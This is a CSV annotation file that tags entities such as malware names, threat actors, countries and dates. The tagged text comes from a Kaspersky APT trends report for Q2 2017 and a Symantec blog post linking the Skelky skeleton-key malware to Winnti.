DocName,text,intent
APT Trends report Q2 2017,"

Best of the rest

5/8



Sometimes we find new and exciting campaigns or entirely new threat actors to
report to our subscribers without being able to make an immediate or definitive
determination on regional provenance.  Several reports fell into this category in the
last quarter.  ChasingAdder is a report describing a new persistence technique that
hijacked a legitimate WMI DLL for the purposes of loading a malicious payload. This
activity targeted high-profile diplomatic, military, and research organizations
beginning in the ",O
APT Trends report Q2 2017,fall of 2016,timestamp
APT Trends report Q2 2017,", but to date we have not been able to pinpoint the
specific actor responsible.

",O
APT Trends report Q2 2017,Demsty,malware
APT Trends report Q2 2017, is a new piece of ,O
APT Trends report Q2 2017,MacOS,software
APT Trends report Q2 2017," malware that is targeting University researchers in
",O
APT Trends report Q2 2017,Hong Kong,country
APT Trends report Q2 2017,", among others.  At the time of writing, we have a low confidence
assessment that the campaign was conducted by Chinese-speaking actors, and thus
categorize this as ‘Unknown’ until greater evidence comes to light.

",O
APT Trends report Q2 2017,During Q2,timestamp
APT Trends report Q2 2017,", the mischievous ",O
APT Trends report Q2 2017,ShadowBrokers,threat_actor
APT Trends report Q2 2017," also continued their regular activities
dumping multiple tools and documentation allegedly stolen from ",O
APT Trends report Q2 2017,Equation Group,threat_actor
APT Trends report Q2 2017,". In
",O
APT Trends report Q2 2017,April,timestamp
APT Trends report Q2 2017,", the ",O
APT Trends report Q2 2017,ShadowBrokers,threat_actor
APT Trends report Q2 2017," released another dump of information detailing the alleged
targeting of ",O
APT Trends report Q2 2017,SWIFT,software
APT Trends report Q2 2017, service bureaus and other ,O
APT Trends report Q2 2017,banks,industry
APT Trends report Q2 2017, by ,O
APT Trends report Q2 2017,Equation Group,threat_actor
APT Trends report Q2 2017,".  Since some
of our customers are financial entities, we found it necessary to evaluate the data and
provide an expert’s opinion on the validity of the dump.

Reports in the ‘unknown’ category:

1. ",O
APT Trends report Q2 2017,ShadowBrokers,threat_actor
APT Trends report Q2 2017,’ Lost in translation leak – ,O
APT Trends report Q2 2017,SWIFT,software
APT Trends report Q2 2017," attacks analysis
2. ChasingAdder – WMI DLL Hijacking Trojan Targeting High Profile Victims
3. University Researchers Located in ",O
APT Trends report Q2 2017,Hong Kong,country
APT Trends report Q2 2017, Targeted with ,O
APT Trends report Q2 2017,Demsty,malware
APT Trends report Q2 2017,"

Predictions

Based on the trends we’ve seen over the last three months, as well as foreseeable
geopolitical events, we have listed a few predictions for the upcoming quarter (Q3). As
always, this isn’t an exact science and some cases won’t come to fruition. Analyzing
current and future events and combining those with the motivations of known active
actors can help organizations prepare for likely forthcoming activity:

1. Misinformation campaigns will remain a threat to countries with upcoming
elections, specifically ",O
APT Trends report Q2 2017,Germany,country
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Norway,country
APT Trends report Q2 2017,", as they have been previous targets
for Eastern European based actors.

2. ‘Lawful Surveillance’ tools will continue to be utilized by governments that don’t
have well-established Cyber Operations capabilities, mainly based out of the
",O
APT Trends report Q2 2017,Middle East,country
APT Trends report Q2 2017,. Companies such as ,O
APT Trends report Q2 2017,Gamma Group,org
APT Trends report Q2 2017,", ",O
APT Trends report Q2 2017,Hacking Team,org
APT Trends report Q2 2017,", and ",O
APT Trends report Q2 2017,NSO,org
APT Trends report Q2 2017," will
continue to offer new zero-day exploits to those customers. As prices increase
and exchanges thrive, new organizations and marketplaces will continue
popping up.

3. Destructive malware disguised as ransomware will continue to be a problem. In
the last quarter we’ve seen two instances of this, and with the continued release
of tools / exploits from dumps like ",O
APT Trends report Q2 2017,Vault7,threat_actor
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,ShadowBrokers,threat_actor
APT Trends report Q2 2017,", this is going to
be a new alarming trend to deal with.

6/8



4. In ",O
APT Trends report Q2 2017,CHINA,country
APT Trends report Q2 2017,", the past months have been marked by the dwindling economic
growth, rising tensions with ",O
APT Trends report Q2 2017,North Korea,country
APT Trends report Q2 2017, and the ,O
APT Trends report Q2 2017,US,country
APT Trends report Q2 2017,", and increased exchanges
between South Korean / Japanese / American organizations. In addition to
these, the 19th Party Congress is set to be held in the ",O
APT Trends report Q2 2017,fall of 2017,timestamp
APT Trends report Q2 2017," and according
to multiple public predictions, it is likely that some major changes will happen in
the leadership. It’s possible that these events will have wide regional influences
that could affect the way that threat actors operate in ",O
APT Trends report Q2 2017,ASIA,country
APT Trends report Q2 2017,", both in terms of
targeting and TTPs.

5. Targeting energy-related companies and organizations will be on the rise.
Countries such as ",O
APT Trends report Q2 2017,Norway,country
APT Trends report Q2 2017," may be a top target moving forward given their
control on oil and gas in the region in the buildup to an election. Saudi Arabia
will also top the charts for potential targeting as they have in years past.

6. Lower-tier threat actors continue to increase cyber-espionage efforts and
capabilities both in complexity and size. Expect more activity with varied
technical capabilities coming from lesser known or previously unseen actors.

How to keep yourself protected

One of the biggest problems when it comes to leveraging threat intelligence is judging
the quality of the data and how it can be used for defense. For instance, we may
observe an increase in the number of fileless attacks or attacks in which all IOCs are
unique or specific per victim. In such situations, having not only host-based IOCs, but
also network IOCs and Yara rules that can help identify malware in all cases is very
important.

Another problem comes from the fact that many threat intelligence providers have a
limited world view and their data covers only a small set of threats. It’s easy for an
enterprise to fall into the trap of thinking that ‘actor X’ is not something they need to
worry because their focus has been only certain countries or certain industry sectors;
only to discover later that their ignorance left them blind to those attacks.

As shown by many incidents, but especially by ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,ExPetr,malware
APT Trends report Q2 2017,’s ,O
APT Trends report Q2 2017,EternalBlue,malware
APT Trends report Q2 2017,"-
based spreading subroutines, vulnerabilities remain a key approach to infecting
systems. Therefore timely patching is of utmost importance – which, being one of the
most tedious IT maintenance tasks, works much better with good automation.
",O
APT Trends report Q2 2017,Kaspersky Endpoint Security for Business Advanced,software
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Kaspersky Total Security,software
APT Trends report Q2 2017,"
include Vulnerability & Patch management components, offering convenient tools for
making patching much easier, and much less time-consuming for IT staff.

Given the above, it is highly recommended that prevention (such as endpoint
protection) along with advanced detection capabilities, such as a solution that can
detect all types of anomalies and scrutinize suspicious files at a deeper level, be
present on users’ systems. The ",O
APT Trends report Q2 2017,Kaspersky Anti Targeted Attack,software
APT Trends report Q2 2017, solution (,O
APT Trends report Q2 2017,KATA,software
APT Trends report Q2 2017,")
matches events coming from different infrastructure levels, discerns anomalies and
aggregates them into incidents, while also studying related artifacts in a safe
environment of a sandbox. As with most ",O
APT Trends report Q2 2017,Kaspersky,org
APT Trends report Q2 2017," products, ",O
APT Trends report Q2 2017,KATA,software
APT Trends report Q2 2017," is powered by

7/8



",O
APT Trends report Q2 2017,HuMachine Intelligence,software
APT Trends report Q2 2017,", which is backed by on premise and in lab-running machine
learning processes coupled with real-time analyst expertise and our understanding of
threat intelligence big data.

The best way to prevent attackers from finding and leveraging security holes, is to
eliminate the holes altogether, including those involving improper system
configurations or errors in proprietary applications. For this, ",O
APT Trends report Q2 2017,Kaspersky Penetration Testing and Application Security Assessment,software
APT Trends report Q2 2017," services can become a convenient and
highly effective solution, providing not only data on found vulnerabilities, but also
advising on how to fix it, further strengthening corporate security.

https://youtu.be/JS4tbSWQb90

8/8

https://youtu.be/JS4tbSWQb90

	APT Trends report ",O
APT Trends report Q2 2017,Q2 2017,timestamp
APT Trends report Q2 2017,"
	Introduction
	Russian-Speaking Actors
	English-Speaking Actors
	Korean-speaking Actors
	Middle Eastern Actors
	Chinese-Speaking Actors
	Best of the rest
	Predictions
	How to keep yourself protected",O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky," attackers have a skeleton in their closet?


",O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky," attackers have a skeleton in
their closet?
New evidence suggests that the skeleton key malware, known as ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky,", could be linked to the
",O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky," malware family.
By: ",O
BackdoorWinnti_TrojanSkelky,Gavin O Gorman,identity
BackdoorWinnti_TrojanSkelky, ,O
BackdoorWinnti_TrojanSkelky,Symantec,org
BackdoorWinnti_TrojanSkelky," Employee
Created ",O
BackdoorWinnti_TrojanSkelky,29 Jan 2015,timestamp
BackdoorWinnti_TrojanSkelky,"

Contributor: ",O
BackdoorWinnti_TrojanSkelky,Nikolas Tsapkis,identity
BackdoorWinnti_TrojanSkelky,"

On ",O
BackdoorWinnti_TrojanSkelky,"January 12, 2015",timestamp
BackdoorWinnti_TrojanSkelky,", ",O
BackdoorWinnti_TrojanSkelky,Dell,org
BackdoorWinnti_TrojanSkelky, Secureworks blogged about a tool (,O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky,") that allows attackers to
â€œuse a password of their choosing to authenticate as any user.â€ The ",O
BackdoorWinnti_TrojanSkelky,Skelky,malware
BackdoorWinnti_TrojanSkelky," (from skeleton key)
tool is deployed when an attacker gains access to a victimâ€™s network; the attackers may also
utilize other tools and elements in their attack. 

Symantec has analyzed ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky, and found that it may be linked to the ,O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky,"
malware family. The attackers behind the ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky," campaign appear to have been using the
malware in conjunction with this back door threat. Itâ€™s unclear if the malware family
",O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky," is used by one attack group or many groups.

During our research, we also found that ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky," has been active over the past two years. Within
this timeframe, we have seen new variants and a consistent hashed password value.

Where is ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky," being used?

1 of 3



",O
BackdoorWinnti_TrojanSkelky,Symantec,org
BackdoorWinnti_TrojanSkelky," telemetry identified the skeleton key malware on compromised computers in five
organizations with offices in the ",O
BackdoorWinnti_TrojanSkelky,United States,country
BackdoorWinnti_TrojanSkelky, and ,O
BackdoorWinnti_TrojanSkelky,Vietnam,country
BackdoorWinnti_TrojanSkelky,". The exact nature and names of the
affected organizations is unknown to ",O
BackdoorWinnti_TrojanSkelky,Symantec,org
BackdoorWinnti_TrojanSkelky,. The first activity was seen in ,O
BackdoorWinnti_TrojanSkelky,January 2013,timestamp
BackdoorWinnti_TrojanSkelky, and ,O
BackdoorWinnti_TrojanSkelky,until November 2013,timestamp
BackdoorWinnti_TrojanSkelky,", there was no further activity involving the skeleton key malware.
",O
BackdoorWinnti_TrojanSkelky,In November 2013,timestamp
BackdoorWinnti_TrojanSkelky,", the attackers increased their usage of the tool and have been active ever since. Four more
variants of ",O
